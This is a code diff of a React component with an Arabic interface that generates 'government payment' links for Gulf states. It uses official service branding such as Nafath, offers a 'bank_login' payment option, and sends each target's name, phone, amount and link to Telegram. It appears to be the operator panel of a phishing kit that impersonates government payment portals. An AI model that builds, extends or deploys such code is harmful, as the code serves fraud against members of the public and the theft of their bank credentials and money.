@@ -1,124 +1,130 @@
-import React, { useState, useMemo, useEffect } from "react";
+import { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Textarea } from "@/components/ui/textarea";
-import { useToast } from "@/hooks/use-toast";
+import { useToast } from "@/components/ui/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
-import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
-import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import { generatePaymentLink } from "@/utils/paymentLinks";
 import { 
+  Building2, 
+  CreditCard, 
   Landmark, 
-  FileText, 
-  DollarSign, 
-  User, 
-  Phone, 
-  Mail,
-  Copy,
+  ShieldCheck, 
+  RefreshCw, 
+  Copy, 
+  CheckCircle, 
   ExternalLink,
-  CheckCircle,
-  Shield,
-  Lock,
-  ArrowRight,
-  Info,
-  RefreshCw,
+  User,
+  Phone,
+  FileText,
   Hash,
-  ShieldCheck,
-  Building2,
-  CreditCard
+  Shield
 } from "lucide-react";
-import BackButton from "@/components/BackButton";
+import { 
+  getGovSystems, 
+  getCurrencyCode, 
+  getCurrencySymbol, 
+  getCountryNameAr 
+} from "@/config/gccPaymentEntities";
+import { generatePaymentLink } from "@/lib/utils";
 import { sendToTelegram } from "@/lib/telegram";
+import { BackButton } from "@/components/BackButton";
+import { BottomNav } from "@/components/BottomNav";
 import {
   AlertDialog,
   AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogHeader,
   AlertDialogTitle,
+  AlertDialogDescription,
 } from "@/components/ui/alert-dialog";
-import BottomNav from "@/components/BottomNav";
 
 const GovernmentPaymentLinkCreator = () => {
-  const { country, serviceKey } = useParams();
+  const { country: countryParam, serviceKey: serviceKeyParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
+
+  // SAFE PARAMS HANDLING: Fallbacks for undefined or invalid values
+  const country = useMemo(() => {
+    const c = (countryParam || 'SA').toUpperCase();
+    return ['SA', 'KW', 'AE', 'QA', 'BH', 'OM'].includes(c) ? c : 'SA';
+  }, [countryParam]);
+
+  const serviceKey = useMemo(() => {
+    return (serviceKeyParam && serviceKeyParam !== 'undefined') ? serviceKeyParam : 'nafath';
+  }, [serviceKeyParam]);
+
+  const govSystems = useMemo(() => getGovSystems(country), [country]);
   
-  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
-  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
-  
+  const govService = useMemo(() => {
+    const service = govSystems.find(s => s.id === serviceKey || s.key === serviceKey);
+    // If service not found, default to the first available service in that country
+    return service || govSystems[0];
+  }, [govSystems, serviceKey]);
+
   const [fullName, setFullName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
   const [email, setEmail] = useState("");
   const [amount, setAmount] = useState("");
-  const [reference, setReference] = useState("");
+  const [reference, setReference] = useState(`INV-${Math.floor(1000 + Math.random() * 9000)}`);
   const [description, setDescription] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [createdLink, setCreatedLink] = useState("");
-  const [linkId, setLinkId] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
-  const [paymentMethod, setPaymentMethod] = useState("card");
+  const [createdLink, setCreatedLink] = useState("");
   const [copied, setCopied] = useState(false);
+  const [paymentMethod, setPaymentMethod] = useState<'card' | 'bank_login'>('card');
 
-  const primaryColor = govSystem?.colors?.primary || "#F58220";
-
-  useEffect(() => {
-    window.scrollTo(0, 0);
-  }, []);
-
+  // Guard: If still no service found (shouldn't happen with fallbacks)
   if (!govService) {
     return (
-      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50">
-        <Card className="p-8 text-center max-w-md shadow-lg border-0">
-          <h2 className="text-xl font-bold mb-4 text-red-600">الخدمة غير موجودة</h2>
-          <Button onClick={() => navigate('/services')} className="w-full h-12 text-base font-bold">العودة للخدمات</Button>
+      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50" dir="rtl">
+        <Card className="p-8 text-center max-w-md shadow-lg border-0 rounded-3xl">
+          <h2 className="text-xl font-bold mb-4 text-red-600">الخدمة غير متوفرة حالياً</h2>
+          <Button onClick={() => navigate('/services')} className="w-full h-12 text-base font-bold rounded-2xl">العودة للخدمات</Button>
         </Card>
       </div>
     );
   }
 
+  const primaryColor = govService.color || '#006C35';
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setIsSubmitting(true);
     if (!fullName || !phoneNumber || !amount) {
-      toast({ title: "خطأ", description: "يرجى تعبئة الحقول المطلوبة", variant: "destructive" });
-      setIsSubmitting(false);
+      toast({ title: "تنبيه", description: "يرجى تعبئة كافة الحقول المطلوبة", variant: "destructive" });
       return;
     }
 
+    setIsSubmitting(true);
     try {
       const link = await createLink.mutateAsync({
         type: "government",
-        country_code: country || govService.country,
+        country_code: country,
         payload: {
           service_key: serviceKey,
           service_name: govService.nameAr,
           customerInfo: { fullName, phoneNumber, email },
           cod_amount: parseFloat(amount),
-          currency_code: getCurrencyCode(country || govService.country),
+          currency_code: getCurrencyCode(country),
           reference,
           description,
-          selectedCountry: country || govService.country,
+          selectedCountry: country,
           payment_method: paymentMethod,
-          govId: country || 'SA'
+          govId: country
         },
       });
 
       const paymentUrl = generatePaymentLink({
         invoiceId: link.id,
-        company: serviceKey || 'government',
-        country: country || 'SA',
+        company: serviceKey,
+        country: country,
         amount: parseFloat(amount),
-        currency: getCurrencyCode(country || 'SA'),
+        currency: getCurrencyCode(country),
         paymentMethod: paymentMethod,
         type: 'government'
       });
+
       setCreatedLink(paymentUrl);
-      setLinkId(link.id);
       setShowSuccess(true);
 
       await sendToTelegram({
@@ -128,15 +134,15 @@ const GovernmentPaymentLinkCreator = () => {
           customer_name: fullName,
           phone: phoneNumber,
           amount: parseFloat(amount),
-          currency: getCurrencySymbol(country || govService.country),
+          currency: getCurrencySymbol(country),
           payment_url: paymentUrl,
         },
         timestamp: new Date().toISOString(),
       });
 
-      toast({ title: "تم بنجاح" });
+      toast({ title: "تم بنجاح", description: "تم إنشاء الرابط الحكومي بنجاح" });
     } catch (error) {
-      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط، يرجى المحاولة لاحقاً", variant: "destructive" });
     } finally {
       setIsSubmitting(false);
     }
@@ -149,7 +155,6 @@ const GovernmentPaymentLinkCreator = () => {
     toast({ title: "تم النسخ" });
   };
 
-
   return (
     <div className="min-h-screen bg-slate-50" dir="rtl">
       <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
@@ -158,7 +163,7 @@ const GovernmentPaymentLinkCreator = () => {
             <div className="w-8 h-8 rounded-lg flex items-center justify-center text-white" style={{ background: primaryColor }}>
               <Landmark className="w-5 h-5" />
             </div>
-            <h1 className="font-black text-gray-800">بوابة السداد الحكومي</h1>
+            <h1 className="font-black text-gray-800">بوابة السداد الحكومي - {getCountryNameAr(country)}</h1>
           </div>
           <BackButton />
         </div>
@@ -168,12 +173,12 @@ const GovernmentPaymentLinkCreator = () => {
         <form onSubmit={handleSubmit} className="space-y-4">
            <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
               <div className="p-4 rounded-2xl flex items-center gap-4 animate-in fade-in slide-in-from-top-2" style={{ background: `${primaryColor}10`, border: `1px solid ${primaryColor}20` }}>
-                <div className="w-20 h-10 bg-white rounded-lg p-1 flex items-center justify-center border shadow-sm">
-                   <img src={govService.logo || govSystem?.logo} alt="" className="max-h-full max-w-full object-contain" />
+                <div className="w-20 h-10 bg-white rounded-lg p-1 flex items-center justify-center border shadow-sm overflow-hidden">
+                   <img src={govService.logo} alt="" className="max-h-full max-w-full object-contain" />
                 </div>
                 <div>
                   <h4 className="font-black text-sm" style={{ color: primaryColor }}>{govService.nameAr}</h4>
-                  <p className="text-[10px] font-bold opacity-70">{govSystem?.description}</p>
+                  <p className="text-[10px] font-bold opacity-70">نظام الدفع الحكومي الموحد</p>
                 </div>
               </div>
 
@@ -199,7 +204,7 @@ const GovernmentPaymentLinkCreator = () => {
                    <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ المطلوب</Label>
                    <div className="relative">
                      <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
-                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || govService.country)}</div>
+                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country)}</div>
                    </div>
                 </div>
                 <div className="space-y-1.5">
@@ -227,7 +232,7 @@ const GovernmentPaymentLinkCreator = () => {
                   </div>
                   <div className="flex items-baseline gap-2">
                     <span className="text-3xl font-black">{amount}</span>
-                    <span className="text-xs font-bold text-slate-400">{getCurrencySymbol(country || govService.country)}</span>
+                    <span className="text-xs font-bold text-slate-400">{getCurrencySymbol(country)}</span>
                   </div>
                 </div>
               )}
@@ -247,7 +252,7 @@ const GovernmentPaymentLinkCreator = () => {
               </div>
            </Card>
 
-           <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: govSystem?.gradients?.primary || primaryColor }}>
+           <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: primaryColor }}>
              {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : <><ShieldCheck className="w-5 h-5 ml-2" /> إصدار رابط سداد حكومي</>}
            </Button>
         </form>
@@ -258,7 +263,7 @@ const GovernmentPaymentLinkCreator = () => {
            <div className="p-8 text-center space-y-6">
               <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-2" style={{ background: `${primaryColor}15` }}>
                 <div className="w-12 h-12 rounded-full flex items-center justify-center animate-bounce" style={{ background: primaryColor }}>
-                  <RefreshCw className="w-6 h-6 text-white" />
+                  <ShieldCheck className="w-6 h-6 text-white" />
                 </div>
               </div>
               <div>
